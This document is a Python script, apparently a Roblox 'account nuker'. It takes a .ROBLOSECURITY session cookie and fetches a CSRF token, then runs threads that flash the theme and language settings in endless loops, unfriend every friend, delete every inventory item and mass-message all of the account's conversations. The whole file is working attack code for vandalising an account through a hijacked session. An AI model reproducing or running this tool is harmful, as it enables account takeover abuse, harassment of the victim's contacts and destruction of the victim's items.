import threading, requests, time, os
from termcolor import cprint
# Made by Ice Bear#0167
def getXsrf(cookie):
      xsrfRequest = requests.post("https://auth.roblox.com/v2/logout", cookies={
          '.ROBLOSECURITY': cookie
      })
      return xsrfRequest.headers["x-csrf-token"]
def clear():
  if os.name == 'nt':
    os.system("cls")
  else:
    os.system("clear")
class Nuke:
  global headers
  global cookie
  def flash(_):
    print("[", end="")
    cprint(" NUKER ", "magenta", end="")
    print("] " , end="")
    cprint("Flashing....", "magenta")
    print("[", end="")
    cprint(" NUKER ", "yellow", end="")
    print("] " , end="")
    cprint("Press Ctrl + C", "yellow")
    try:
      while True:
        requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers,data={"themeType": "Light"})
        requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers,data={"themeType": "Dark"})
    except:
      print("[", end="")
      cprint(" NUKER ", "magenta", end="")
      print("] " , end="")
      for i in 'Done Nuking...':
        time.sleep(0.1)
        cprint(i, "magenta",end="", flush=True)
  def changeLanguage(_):
    try:
      goOn
    except:
      time.sleep(1.5)
    while goOn:
      requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(cookie)},headers=headers,data={"supportedLocaleCode": "ja_jp"})
      requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(cookie)},headers=headers,data={"supportedLocaleCode": "ko_kr"})
  def messageAll(message, _):
    print("[", end="")
    cprint(" NUKER ", "magenta", end="")
    print("] " , end="")
    cprint("Messaging friends....", "magenta")
    conversations = requests.get("https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers).json()
    for conversation in conversations:
      requests.post("https://chat.roblox.com/v2/send-message",data={"conversationId": conversation["id"], "message": message}, cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers)
      print("[", end="")
      cprint(" NUKER ", "magenta", end="")
      print("] " , end="")
      cprint(f"Sent message to {conversation['id']}", "magenta")
  def removeItems(_):
    items = requests.get(f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={userid}",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers).json()["Data"]["Items"]
    for item in items:
      time.sleep(4)
      id = item["Item"]["AssetId"]
      response = requests.post("https://www.roblox.com/asset/delete-from-inventory", data={"assetId": str(id)},cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers)
      if response.status_code == 429:
        time.sleep(10)
        response = requests.post("https://www.roblox.com/asset/delete-from-inventory", data={"assetId": id},cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers)
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] " , end="")
        cprint(f"Removed {id} from user's inventory", "magenta")
      else:
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] " , end="")
        cprint(f"Removed {id} from user's inventory", "magenta")
    print("[", end="")
    cprint(" NUKER ", "magenta", end="")
    print("] " , end="")
    cprint("Removed all items from user's inventory", "magenta")
    time.sleep(1)
  def unfriend(_):
    print("[", end="")
    cprint(" NUKER ", "magenta", end="")
    print("] " , end="")
    cprint("Unfriending friends....", "magenta")
    friends = requests.get(f"https://friends.roblox.com/v1/users/{userid}/friends", cookies={'.ROBLOSECURITY': str(cookie)}).json()['data']
    friendIds = [friend['id'] for friend in friends]
    for i in friendIds:
      time.sleep(0.1)
      print(requests.post(f"https://friends.roblox.com/v1/users/{i}/unfriend",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers).text)
      print("[", end="")
      cprint(" NUKER ", "magenta", end="")
      print("] " , end="")
      cprint(f"Unfriended {i}!", "magenta")
    print("[", end="")
    cprint(" NUKER ", "magenta", end="")
    print("] " , end="")
    cprint("Unfriended All!", "magenta")
  def check(_):
    global cookie
    global message
    print("[", end="")
    cprint(" NUKER ", "magenta", end="")
    print("] " , end="")
    cprint("Enter Your Cookie Below:", 'magenta')
    cookie = input("> ")
    print("[", end="")
    cprint(" NUKER ", "magenta", end="")
    print("] " , end="")
    cprint("Enter Your mass dm message below:", 'magenta')
    message = input("> ")
    return requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)})
  def start(_):
    global headers
    global userid
    global goOn
    goOn = True
    check = Nuke.check()
    if check.status_code ==200:
      headers={'X-CSRF-TOKEN': getXsrf(cookie)}
      userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
      userid = userdata['id'] #user id
      clear()
      threading.Thread(target=Nuke.flash).start()
      threading.Thread(target=Nuke.unfriend).start()
      threading.Thread(target=Nuke.changeLanguage).start()
      threading.Thread(target=Nuke.removeItems).start()
      threading.Thread(target=Nuke.messageAll, args=(message,)).start()
    else:
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("] " , end="")
      cprint("Invalid Cookie", 'red')
      time.sleep(1.4)
      clear()
      Nuke.check()
if __name__ == '__main__':
  Nuke = Nuke()
  Nuke.start()
  # Coded by Ice Bear#0167
